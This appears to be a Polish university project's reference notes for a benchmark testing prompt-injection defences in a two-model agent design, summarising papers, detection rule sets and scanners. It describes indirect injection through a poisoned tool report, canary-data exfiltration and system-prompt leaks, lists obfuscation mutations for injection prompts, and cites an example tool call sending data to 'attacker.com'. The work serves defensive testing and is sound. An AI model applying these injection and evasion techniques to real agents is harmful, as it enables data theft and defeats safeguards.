# SOTA Research & Benchmark References (2025/2026)

Tytuł projektu: **Dual-LLM Security Benchmark (`group_BlueMoon`)**  
Kontekst: Przedmiot *AI Exploration 2026*, AGH Cyberbezpieczeństwo, rok 3.  
Prowadzący: dr hab. inż. Jarosław Bułat (`kwant`).

Zbiór literatury naukowej, standardów branżowych i wektorów testowych zidentyfikowanych w ramach audytu `sindresorhus/awesome` (`FonduAI/awesome-prompt-injection`, `cpuu/awesome-fuzzing`) oraz `public-apis/public-apis`.

---

## 1. Kluczowe publikacje naukowe (State of the Art)

### [1] The Landscape of Prompt Injection Threats in LLM Agents (SoK)
- **Autorzy & Źródło**: arXiv:2602.10453 (Luty 2026).
- **Kluczowy wkład**: Systematyzacja wiedzy (Systematization of Knowledge) w obszarze agentów LLM.
- **Taksonomia**:
  - *Wektory ataku*: Heurystyczne vs. oparte na optymalizacji matematycznej.
  - *Etapy obrony*:
    1. **Text-level**: filtry wejściowe / sanacja promptu.
    2. **Model-level**: trenowanie odporności, system prompty.
    3. **Execution-level**: monitorowanie wywołań narzędzi i uprawnień (dokładnie to, co robimy w architekturze Dual-LLM z Jev!).
- **Benchmark referencyjny**: Wprowadzenie benchmarku *AgentPI* dla zadań zależnych od kontekstu agenta.

### [2] ToolHijacker: Prompt Injection Attack to Tool-Calling LLM Agents
- **Kluczowy wkład**: Atak polegający na wstrzyknięciu instrukcji zmuszającej model do wywołania uprzywilejowanego narzędzia (np. `exfiltrate_data(target='attacker.com')` lub `delete_records()`).
- **Zastosowanie w BlueMoon**: Bezpośrednie uzasadnienie dla podziału na *Untrusted Planner* i *Hardened Executor* oraz zastosowania filtrów *Jev System-1* przed wykonaniem akcji.

### [3] Securing AI Agents Against Prompt Injection Attacks
- **Autorzy & Źródło**: arXiv:2511.15759 (Listopad 2025).
- **Kluczowy wkład**: Analiza kompromisu między bezpieczeństwem a użytecznością biznesową (Trade-off Matrix).
- **Wyniki**: Redukcja ASR z 73.2% do 8.7% przy zachowaniu 94.3% pierwotnej sprawności wykonywania zadań.
- **Zastosowanie w BlueMoon**: Metodologiczna podbudowa dla **ADR-005** (Dual-Dimension Benchmark: Security ASR vs. Technical Planning Ground Truth).

---

## 2. Standardy branżowe i formaty detekcji

### [1] Agent Threat Rules (ATR)
- **Repozytorium**: `Agent-Threat-Rule/agent-threat-rules` (Wdrożone produkcyjnie m.in. w Microsoft Agent Governance Toolkit i Cisco AI Defense).
- **Format**: Reguły w formacie YAML (analogicznie do reguł Sigma/YARA w klasycznym SOC).
- **Mapowanie standardów**:
  - OWASP Agentic Top 10 (10/10)
  - MITRE ATLAS (100/113)
  - NIST AI RMF (100%)
- **Zastosowanie w BlueMoon**:
  - Wzbogacenie filtru System-1 (Jev + local fallback) o gotowe sygnatury i wzorce manipulacji agentem.
  - Wykazanie w sprawozdaniu dla AGH zgodności ze standardem OWASP i MITRE ATLAS.

### [2] Garak & Augustus (Praetorian)
- **Garak**: Zautomatyzowany skaner podatności LLM (jailbreaki, wycieki danych, halucynacje).
- **Augustus**: Narzędzie open-source (Luty 2026) od Praetorian — 210+ sond atakujących w 47 kategoriach.

---

## 3. Mocki narzędzi i wektory Indirect Injection (z Public-APIs)

Zgodnie z **ADR-006** nie odpytujemy zewnętrznych domen w runtime. Wykorzystujemy ich schematy jako lokalne mocki offline w `src/pipeline/tools/`:

| Domena | Wzorzec z `public-apis` | Rola w systemie | Wektor ataku / Test |
|---|---|---|---|
| **Threat Intel / Info** | AbuseIPDB / VirusTotal | Odczyt danych (niski poziom uprawnień) | **Indirect Injection**: zatruty raport z ukrytą instrukcją dla Executora |
| **Exfiltration Webhook** | Postman Echo / Pusher | Wysyłka na zewnątrz (wysoki poziom uprawnień) | **Data Exfiltration**: próba wypchnięcia `CANARY_FLAG_...` |
| **Baza Techniczna** | Local Inventory Mock | Baza sprzętu i stawek | **Jailbreak / System Prompt Leak**: próba wydobycia marży hurtowej |

---

## 4. Wykorzystanie technik Fuzzingu (`awesome-fuzzing`)

Dla osiągnięcia maksymalnej noty (3 pkt u dr. Bułata za automatyzację i wariancję):
- Zamiast statycznej listy 20 promptów, moduł `src/evaluation/` wykorzysta **generator mutacyjny**:
  - Obfuskacja Base64 / Hex
  - Zamiana znaków (Leet-speak / Homoglyphs)
  - Podmiana języka (wielojęzyczne presje: polski, angielski, mandaryński, zulu)
  - Payload splitting (rozbicie złośliwej frazy na kilka fragmentów)
- Skrypt generuje serie N=10 powtórzeń na wariant w celu zmierzenia stabilności statystycznej (odchylenie standardowe ASR).
